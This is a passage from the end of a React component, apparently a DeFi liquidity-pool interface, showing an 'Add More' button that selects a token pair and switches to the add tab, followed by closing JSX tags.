                              setSelectedPool(`${position.token0Symbol}/${position.token1Symbol}`);
                              setSelectedTab("add");
                            }}
                            className="flex-1 bg-gradient-to-r from-hyper-mint to-hyper-teal text-black"
                          >
                            Add More
                          </Button>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>
            )}
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}